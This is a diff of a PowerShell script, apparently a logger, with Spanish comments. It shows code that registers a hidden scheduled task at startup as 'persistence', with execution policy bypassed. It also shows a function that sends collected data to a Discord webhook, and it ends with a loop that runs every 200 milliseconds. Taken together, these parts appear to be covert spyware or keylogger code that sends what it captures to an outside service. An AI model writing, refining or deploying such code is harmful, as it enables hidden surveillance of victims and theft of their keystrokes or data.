@@ -10,21 +10,20 @@ if (-not (Test-Path $logDir)) {
     New-Item -ItemType Directory -Path $logDir -Force | Out-Null
 }
 
-# CREAR TAREA PROGRAMADA PARA INICIO (si no existe)
+# REGISTRAR TAREA PROGRAMADA PARA PERSISTENCIA (SI NO EXISTE)
 $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $task) {
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
     $trigger = New-ScheduledTaskTrigger -AtStartup
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Ejecuta logger.ps1 al inicio del sistema" -Force
 }
 
-# FUNCIÓN PARA ENVIAR A DISCORD
+# FUNCIÓN PARA ENVIAR DATOS A DISCORD
 function Send-ToDiscord {
     param ($content)
     try {
-        $body = @{
-            content = $content
-        } | ConvertTo-Json
+        $body = @{ content = $content } | ConvertTo-Json
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop
         return $true
     } catch {
@@ -72,4 +71,3 @@ while ($true) {
 
     Start-Sleep -Milliseconds 200
 }
-
